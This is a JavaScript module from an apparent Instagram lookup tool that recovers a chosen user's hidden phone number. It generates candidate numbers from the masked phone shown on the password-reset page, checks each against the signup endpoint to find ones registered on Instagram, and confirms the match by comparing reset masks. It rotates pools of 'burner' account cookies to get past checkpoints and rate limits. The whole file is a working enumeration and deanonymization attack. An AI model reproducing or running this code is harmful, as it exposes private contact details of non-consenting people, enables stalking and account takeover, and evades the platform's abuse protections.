/**
 * §2.2 STAGE 4 — Phone enumeration via `web_create_ajax/attempt/`.
 *
 * Identical structure to `emailEnumerator.js` but with `phone_id` /
 * `phone_number` form fields. The search space is BIGGER (country
 * code + 6-7 unknown middle digits) so we lean harder on the carrier
 * prefix dictionary (`carrierPrefixes.json`) to keep candidates
 * inside known number plans.
 *
 * Confirmation works the same way as email: re-query
 * `account_recovery_send_ajax` with the candidate phone and compare
 * the returned obfuscated_phone vs the target's mask.
 */

'use strict';

const logger = require('../../../utils/logger');
const { igFetch } = require('../igFetch');
const burnerPool = require('../../../services/burnerPoolService');
const lookupLimiter = require('./lookupLimiter');
const candidateGenerator = require('./candidateGenerator');
const { fromBurner } = require('./burnerCtx');
const { _maskHash } = require('./resetOracle');

const WEB_CREATE_AJAX =
  'https://www.instagram.com/accounts/web_create_ajax/attempt/';
const ACCOUNT_RECOVERY_SEND_AJAX =
  'https://www.instagram.com/accounts/account_recovery_send_ajax/';

const DEFAULT_MAX_CANDIDATES = 40;
const DEFAULT_MAX_BURNER_ROTATIONS = 3;

function _isPhoneTakenResponse(body) {
  if (!body || typeof body !== 'object') return false;
  if (body.errors && body.errors.phone_number && Array.isArray(body.errors.phone_number)) {
    return body.errors.phone_number.some((m) =>
      /taken|already|in use|registered/i.test(String(m))
    );
  }
  if (body.error_type === 'phone_taken') return true;
  return false;
}

function _classify(body) {
  if (!body || typeof body !== 'object') return 'unknown';
  if (_isPhoneTakenResponse(body)) return 'taken';
  if (body.errors && body.errors.phone_number) return 'rejected';
  if (body.status === 'fail' && body.message) {
    const m = String(body.message).toLowerCase();
    if (/checkpoint/.test(m)) return 'checkpoint';
    if (/rate|throttle|wait/.test(m)) return 'rate_limited';
  }
  return 'available';
}

async function _probeCandidate(ctx, phoneE164) {
  const form = new URLSearchParams({
    phone_id: phoneE164,
    phone_number: phoneE164,
    enc_password: '#PWD_INSTAGRAM_BROWSER:0:0:',
    username: '',
    first_name: '',
    opt_into_one_tap: 'false',
  }).toString();
  try {
    const r = await igFetch(ctx, WEB_CREATE_AJAX, {
      method: 'POST',
      body: form,
      extraHeaders: {
        'content-type': 'application/x-www-form-urlencoded',
        'x-instagram-ajax': '1',
        'x-csrftoken': ctx.csrftoken || '',
      },
      referer: 'https://www.instagram.com/accounts/emailsignup/',
      skipLimiter: true,
      logErrors: false,
      preSleepMs: 800,
    });
    return { ok: true, body: r };
  } catch (err) {
    return {
      ok: false,
      error: err.kind || 'network',
      message: err.message || String(err),
      statusCode: err.statusCode || null,
    };
  }
}

async function _maskForPhone(anonCtx, phoneE164) {
  const form = new URLSearchParams({
    email_or_username: phoneE164,
    recover_token: '',
    flow: 'web_password_recovery',
  }).toString();
  try {
    return await igFetch(anonCtx, ACCOUNT_RECOVERY_SEND_AJAX, {
      method: 'POST',
      body: form,
      extraHeaders: {
        'content-type': 'application/x-www-form-urlencoded',
        'x-instagram-ajax': '1',
      },
      referer: 'https://www.instagram.com/accounts/password/reset/',
      skipLimiter: true,
      logErrors: false,
      preSleepMs: 400,
    });
  } catch (err) {
    return { error: err.kind || 'network', message: err.message || String(err) };
  }
}

async function run(username, opts = {}) {
  const cleaned = String(username || '').trim().replace(/^@+/, '').toLowerCase();
  if (!/^[a-z0-9._]{1,30}$/i.test(cleaned)) {
    return {
      method: 'phone_enum',
      ok: false,
      error: 'invalid_username',
      findings: [],
    };
  }

  const targetMask = opts.targetMask || (opts.resetOracleSnapshot && opts.resetOracleSnapshot.obfuscated_phone) || null;
  const targetMaskHash = targetMask ? _maskHash(targetMask) : null;

  const candidates = candidateGenerator.phoneCandidates(targetMask, {
    maxCandidates: opts.maxCandidates || DEFAULT_MAX_CANDIDATES,
  });

  if (!candidates.length) {
    return {
      method: 'phone_enum',
      ok: true,
      findings: [{
        method: 'phone_enum',
        kind: 'note',
        value: targetMask
          ? `phone_enum: no candidates generated for mask=${targetMask}`
          : 'phone_enum: no obfuscated_phone mask available — run reset_oracle first',
        confidence: 0,
      }],
      raw: { mask: targetMask, candidateCount: 0 },
    };
  }

  // Wide search space → cap to top-N by confidence.
  const slice = candidates
    .sort((a, b) => (b.confidence || 0) - (a.confidence || 0))
    .slice(0, opts.maxCandidates || DEFAULT_MAX_CANDIDATES);

  await lookupLimiter.acquire(cleaned, { class: 'risky' });

  let burner = await burnerPool.drawBurner();
  if (!burner) {
    return {
      method: 'phone_enum',
      ok: false,
      error: 'no_burner_available',
      message: 'burner pool empty — add burner cookies on the Burners page or contact admin',
      findings: [{
        method: 'phone_enum',
        kind: 'note',
        value: 'phone_enum: burner pool empty — cannot validate candidates against web_create_ajax',
        confidence: 0,
      }],
    };
  }

  let ctx = fromBurner(burner);
  const anonCtx = {
    sessionId: `lookup-enum:${cleaned}`,
    allowAnonymous: true,
    username: null,
    proxyUrl: null,
    bypassProxy: true,
    cookieHeader: '',
    csrftoken: '',
    dsUserId: null,
    blob: null,
    webFingerprint: ctx.webFingerprint,
    locale: ctx.locale,
    apiMode: 'web',
  };

  const findings = [];
  const probedDetails = [];
  let confirmedPhone = null;
  let rotations = 0;
  const maxRotations = opts.maxBurnerRotations || DEFAULT_MAX_BURNER_ROTATIONS;
  let burnerOutcome = 'ok';

  for (const cand of slice) {
    if (confirmedPhone) break;
    if (!/^\+[0-9]+$/.test(cand.phone)) continue;

    const probe = await _probeCandidate(ctx, cand.phone);
    let classification = 'unknown';
    if (probe.ok) {
      classification = _classify(probe.body);
    } else if (probe.statusCode === 400) {
      classification = _classify(probe.body || {});
    } else if (probe.statusCode === 403 || probe.error === 'forbidden') {
      classification = 'checkpoint';
    } else if (probe.error === 'rate_limited' || probe.statusCode === 429) {
      classification = 'rate_limited';
    }
    probedDetails.push({ phone: cand.phone, classification, confidence: cand.confidence });

    if (classification === 'checkpoint' || classification === 'rate_limited') {
      burnerOutcome = classification === 'checkpoint' ? 'checkpoint' : 'rate_limited';
      await burnerPool.releaseBurner(burner.id, {
        outcome: burnerOutcome,
        block: classification === 'checkpoint',
        blockReason: classification,
      });
      if (rotations >= maxRotations) {
        findings.push({
          method: 'phone_enum',
          kind: 'note',
          value: `phone_enum: burner pool exhausted after ${rotations} rotations (last outcome=${classification})`,
          confidence: 0,
          raw: { rotations, classification, probed: probedDetails },
        });
        break;
      }
      rotations += 1;
      burner = await burnerPool.drawBurner();
      if (!burner) {
        findings.push({
          method: 'phone_enum',
          kind: 'note',
          value: 'phone_enum: ran out of fresh burners — add more on the Burners page',
          confidence: 0,
          raw: { rotations, classification, probed: probedDetails },
        });
        return {
          method: 'phone_enum',
          ok: false,
          error: 'no_burner_available',
          message: 'burner pool drained mid-enumeration',
          findings,
          raw: { mask: targetMask, probed: probedDetails },
        };
      }
      ctx = fromBurner(burner);
      continue;
    }

    if (classification === 'taken') {
      let verified = false;
      let candidateMask = null;
      if (targetMaskHash) {
        const m = await _maskForPhone(anonCtx, cand.phone);
        candidateMask = m && (m.obfuscated_phone || m.phone_number) || null;
        if (candidateMask && _maskHash(candidateMask) === targetMaskHash) {
          verified = true;
          confirmedPhone = cand.phone;
        }
      }
      findings.push({
        method: 'phone_enum',
        kind: 'phone',
        value: cand.phone,
        confidence: verified ? 95 : Math.min(80, (cand.confidence || 40) + 10),
        verified,
        sourceUrl: 'https://www.instagram.com/accounts/web_create_ajax/attempt/',
        raw: {
          stage_4: 'taken',
          mask_match: verified,
          target_mask: targetMask,
          candidate_mask: candidateMask,
          mask_hash: candidateMask ? _maskHash(candidateMask) : null,
        },
      });
    }
  }

  await burnerPool.releaseBurner(burner.id, {
    outcome: burnerOutcome,
    probesUsed: probedDetails.length,
  });

  if (!findings.length) {
    findings.push({
      method: 'phone_enum',
      kind: 'note',
      value: `phone_enum: probed ${probedDetails.length} candidates — no IG-taken hit`,
      confidence: 0,
      raw: { mask: targetMask, probed: probedDetails },
    });
  }

  logger.info(`IG.lookup.phoneEnum: ${cleaned} → probed=${probedDetails.length} confirmed=${confirmedPhone || 'none'}`);

  return {
    method: 'phone_enum',
    ok: true,
    findings,
    raw: {
      mask: targetMask,
      maskHash: targetMaskHash,
      probed: probedDetails,
      confirmedPhone,
      rotations,
    },
    cost_usd_estimate: 0,
  };
}

module.exports = { run, _classify, _isPhoneTakenResponse };
